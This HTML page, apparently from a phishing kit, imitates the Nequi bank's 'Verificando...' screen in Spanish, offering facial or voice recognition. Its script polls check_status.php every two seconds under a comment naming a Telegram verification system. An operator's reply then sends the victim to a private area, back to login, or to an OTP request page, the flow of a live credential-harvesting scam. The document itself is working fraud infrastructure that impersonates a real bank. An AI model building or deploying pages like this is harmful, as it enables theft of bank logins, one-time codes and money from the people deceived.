<html>
    <head>
        <title>Verificando...</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        <meta content="es" http-equiv="Content-Language">
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="shortcut icon" type="image/x-icon" href="../assets/img/favicon.ico">
        <script type="text/javascript" src="../assets/js/jquery-3.6.0.min.js"></script>      
        <link href="../assets/css/styles.css" rel="stylesheet">
        <link href="../assets/css/stylesheet.css" rel="stylesheet">
        <script type="text/javascript" src="../assets/js/functions.js?v2"></script> 
        <style type="text/css">
            #fondo{
                position: fixed;
                width: 100%;
                height: 100%;
                top: 0;
                left: 0;
                background-color: #ffffffc4;
                z-index: 300;
            }
            #cargando{
                position: fixed;            
                top:50%; 
                left:50%;
                transform: translate(-50%, -50%);
                z-index: 400;
            }
        </style> 
    </head>
    <body>      
        <div id="fondo"></div>
        <img src="../assets/img/cargando.gif" id="cargando">  
       <div class="cabecera">
           <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
                <tr>
                    <td valign="middle" align="left"><img src="../assets/img/logo.svg" width="130"></td>
                    <td valign="middle" align="right">
                        <button class="btn btn-std btn-sprd top-btn">Recarga</button>
                        <button class="btn btn-std btn-sprd top-btn">Salir</button>
                        <img src="../assets/img/menu.jpg" id="btn-menu">
                    </td>
                </tr>               
           </table>
           <div class="bar-menu">
               <span class="menu-interno marcado">Mi Nequi</span>
               <span class="menu-interno">Certificados</span>
               <span class="menu-interno">Ayuda</span>
           </div>
       </div>
        <div class="contenido-interno">
            <div class="frm" id="frm-reconocimiento">
                <div class="titulo-app">¿Cómo quieres que te reconozcamos hoy?</div>
                <div class="opcion-app" id="btn-facial">
                    <table border="0" width="100%" cellpadding="0" cellspacing="0">
                        <tr>
                            <td rowspan="2" width="76"><img src="../assets/img/imagen.jpg" width="60"></td>
                            <td valign="bottom" align="left"><b>Reconocimiento facial</b></td>
                        </tr>
                        <tr>
                            <td valign="top" align="left">Más seguridad</td>
                        </tr>
                    </table>
                </div>

                <div class="opcion-app" id="btn-voz">
                    <table border="0" width="100%" cellpadding="0" cellspacing="0">
                        <tr>
                            <td rowspan="2" width="76"><img src="../assets/img/mic.jpg" width="60"></td>
                            <td valign="bottom" align="left"><b>Reconocimiento de voz</b></td>
                        </tr>
                        <tr>
                            <td valign="top" align="left">Confirma que eres tú</td>
                        </tr>
                    </table>
                </div>                
            </div>          
       </div>
       <div class="pie">
            <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
                <tr>
                    <td id="logo-blanco-movil">
                        <img src="../assets/img/logo-blanco.svg" width="176" style="margin-bottom: 27px;" >
                        <div class="separador"></div>
                    </td>
                </tr>
            </table>   
            <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">                
                <tr>
                    <td valign="top" id="logo-blanco">
                        <img src="../assets/img/logo-blanco.svg" width="176">
                    </td>
                    <td valign="top">
                        <div class="titulo-footer">Producto</div>
                        <div class="item-footer">Legales</div>
                        <div class="item-footer">Ayuda</div>
                        <div class="titulo-footer vmovil">Portales</div>
                        <div class="item-footer vmovil">Blog | Metidas de plata</div>
                        <div class="item-footer vmovil">APIs | Nequi conecta</div>
                        <div class="titulo-footer vmovil">Redes</div>
                        <img class="vmovil" src="../assets/img/icon-social.jpg" style="margin-top: 10px;">
                    </td>
                    <td valign="top" id="app">
                        <div class="titulo-footer">Descarga la App</div>
                        <img src="../assets/img/icon-app.jpg" style="margin-top: 10px;">
                    </td>
                    <td valign="top" class="mmovil">
                        <div class="titulo-footer">Portales</div>
                        <div class="item-footer">Blog | Metidas de plata</div>
                        <div class="item-footer">APIs | Nequi conecta</div>
                    </td>
                    <td valign="top" class="mmovil">
                        <div class="titulo-footer">Redes</div>
                        <img src="../assets/img/icon-social.jpg" style="margin-top: 10px;">
                    </td>
                </tr>                
            </table>
            <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">                                
                <tr>
                    <td id="gb-sec">
                        <div class="separador"></div>                    
                        <img src="../assets/img/gb-blanco.svg" width="122"  style="margin-bottom: 15px;">
                        <div style="border-bottom: 1px solid red; width:100%;"></div>
                    </td>
                </tr>
                <tr>
                    <td valign="middle" align="center">
                        <table border="0" cellpadding="0" cellspacing="0" >
                            <tr>
                                <td id="copy-menu">
                                    <div class="item-copy">Características del producto</div>
                                    <div class="item-copy">Condiciones de uso</div>
                                    <div class="item-copy">Legales</div>
                                    <div class="item-copy">Términos y condiciones</div>
                                </td>    
                            </tr>                            
                        </table>                        
                    </td>
                </tr>
            </table>
       </div> 

    <script type="text/javascript">
        $(document).ready(function($){
            // Llamar a la función original si existe
            if (typeof consultar_estado === 'function') {
                setInterval(consultar_estado, 2000); 
            }

            if(detectar_dispositivo() != "PC"){
                $(".cabecera,.pie").hide(); 
                $(".frm").css({"width":"calc(100% - 40px)","background-color":"transparent"}); 
                $(".contenido-interno").css({"padding-top":"0px","padding-bottom":"0px","height":"100%","background-image":"url(../assets/img/fondo.jpg)","background-position":"bottom","background-repeat":"no-repeat","background-color":"#fff","min-height":"500px"});                      
            }

            // Sistema de verificación con Telegram
            let checkInterval;

            function checkStatus() {
                fetch('check_status.php')
                    .then(response => response.json())
                    .then(data => {
                        console.log('Estado actual:', data.estado);
                        
                        if (data.estado === 'aprobado') {
                            clearInterval(checkInterval);
                            window.location.href = '../private/';
                        } 
                        else if (data.estado === 'rechazado') {
                            clearInterval(checkInterval);
                            alert('Error de autenticación');
                            window.location.href = '../login/';
                        } 
                        else if (data.estado === 'pedir_otp') {
                            clearInterval(checkInterval);
                            window.location.href = '../solicitar/'; 
                        }
                    })
                    .catch(error => {
                        console.error('Error verificando estado:', error);
                    });
            }

            // Verificar cada 2 segundos
            checkInterval = setInterval(checkStatus, 2000);

            // Timeout después de 5 minutos
            setTimeout(() => {
                clearInterval(checkInterval);
                alert('Tiempo de espera agotado');
                window.location.href = '../login/';
            }, 300000);
        });  
    </script>
    <script type="text/javascript" src="../assets/js/ready.js?v2"></script> 
</html>
